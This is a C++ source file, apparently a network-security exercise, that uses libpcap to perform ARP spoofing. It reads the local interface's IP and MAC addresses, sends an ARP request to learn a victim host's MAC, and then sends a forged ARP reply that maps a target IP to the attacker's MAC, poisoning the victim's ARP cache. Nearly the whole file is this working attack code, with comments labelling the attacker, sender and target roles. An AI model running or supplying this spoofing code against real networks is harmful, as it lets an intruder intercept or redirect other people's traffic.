#include <cstdio>
#include <pcap.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

struct IpHdr
{
    uint8_t dum0[2];
    uint16_t total_length;   /* total length */
    uint8_t dum1[5];
    uint8_t ip_p;            /* protocol */
    uint8_t dum2[2];
    
    uint32_t ip_src;	      /* src ip */
    uint32_t ip_dst;         /* dst ip */
};

void IntIpChar(char* tar, uint32_t value){
	sprintf(tar, "%u.%u.%u.%u",
		(value & 0xFF000000) >> 24,
		(value & 0x00FF0000) >> 16,
		(value & 0x0000FF00) >> 8,
		(value & 0x000000FF));
}


#pragma pack(push, 1)

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
    char *data_;
};

#pragma pack(pop)

#define ARP_SIZE 42

bool get_ip(char* dev, char* ip) {
	struct ifreq ifr;
	int sfd = socket(AF_INET, SOCK_DGRAM, 0),ret;
	if(sfd < 0){
		printf("Fail to get interface MAC address - socket() failed - %m\n");
		return false;
	}

	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	ret = ioctl(sfd, SIOCGIFADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sfd);
		return false;
	}
	
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, 4*Ip::SIZE);
	close(sfd);
	return true;
}

bool get_mac(char* dev, uint8_t* mac) {
	struct ifreq ifr;
	int sfd = socket(AF_INET, SOCK_DGRAM, 0),ret;
	if(sfd < 0){
		printf("Faile to get interface MAC address - socket() failed - %m\n");
		return false;
	}

	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	ret = ioctl(sfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sfd);
		return false;
	}

	memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
	close(sfd);
	return true;
}

void request_mac(pcap_t* hd, char* sender, uint8_t* amac, char* aip, uint8_t* buf){
    
    EthArpPacket packet;

	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");		
	packet.eth_.smac_ = Mac(amac);						// Attacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(amac);						// Attacker MAC
	packet.arp_.sip_ = htonl(Ip(aip));					// Attacker IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");		
	packet.arp_.tip_ = htonl(Ip(sender));				// Sender IP
	/*/////////                                        //////////*/
	
	// Send Packet
	int res = pcap_sendpacket(hd, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd));
		exit(1);
	}
	
	// Capture Packet
    struct pcap_pkthdr *pkth;
	const u_char *pkt_data;
    struct EthHdr *eth_hdr;
    struct ArpHdr *arp_hdr;
    struct IpHdr *ip_hdr;
    
    while(1){
		printf("trying packet capture...\n");
		res = pcap_next_ex(hd, &pkth, &pkt_data);
		if (res != 1) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(hd));
			exit(1);
		}
		eth_hdr = (EthHdr*)pkt_data;
		arp_hdr = (ArpHdr*)(eth_hdr+1);
        if(ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply && ntohl(arp_hdr->sip_) == Ip(sender)){
            memcpy(buf, &arp_hdr->smac_, Mac::SIZE);
		    break;
        }
	}
}

void change_arp_table(pcap_t* hd, char* sender, char* target, char* aip, uint8_t* smac, uint8_t* amac){
    
    EthArpPacket packet;
	struct pcap_pkthdr *pkth;
	const u_char *pkt_data;

	
	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac(smac);			// Sender Mac
	packet.eth_.smac_ = Mac(amac);  		// Attacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(amac);			// Attacker Mac
	packet.arp_.sip_ = htonl(Ip(target));   // Target IP
	packet.arp_.tmac_ = Mac(smac);			// Sender Mac
	packet.arp_.tip_ = htonl(Ip(sender));   // Sender IP
	/*/////////                                        //////////*/
	
	
	// Send Packet
	int res = pcap_sendpacket(hd, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd));
		return;
	}
}